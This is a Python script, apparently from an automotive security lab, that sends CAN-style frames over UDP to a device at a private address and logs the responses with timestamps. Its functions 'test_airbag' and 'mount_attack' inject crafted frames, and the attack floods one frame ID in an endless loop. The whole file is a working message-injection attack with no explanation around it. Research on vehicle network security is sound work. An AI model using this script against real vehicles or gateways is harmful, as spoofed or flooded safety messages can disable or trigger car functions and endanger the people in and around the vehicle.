import socket
from threading import Thread
import time
from datetime import datetime

target_ip = "192.168.1.177"
target_port = 8888
home_port = 5000
# target_ip = "127.0.0.1"
# target_port = 5000

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
s.bind(("", home_port))


def udp_receive(skt):
    f = open("values.csv", 'w')
    f.truncate(0)
    dt = datetime.now()
    start = dt.second * 1000000 + dt.microsecond
    while True:
        (data, address) = skt.recvfrom(1024)
        dt2 = datetime.now()
        now = round(((dt2.second * 1000000 + dt2.microsecond) - start))
        print(f"Received {data} from {address[0]}:{address[1]}")
        f.write(str(data[0:3]) + ";" + str(data[4:]) + ";" + str(now) + "\n")


t = Thread(target=udp_receive, args=(s,))
t.start()


def test_airbag():
    s.sendto(bytes("050#FFFFFFFFFFFFFFFF", "utf-8"), 0, (target_ip, target_port))


def mount_attack():
    s.sendto(bytes("280#DEADBEEFDEADBEEF" + "000000008802", "utf-8"), 0, (target_ip, target_port))
    time.sleep(0.01)
    while (True):
        s.sendto(bytes("288#33ed000000585200", "utf-8"), 0, (target_ip, target_port))

# test_airbag()
# mount_attack()
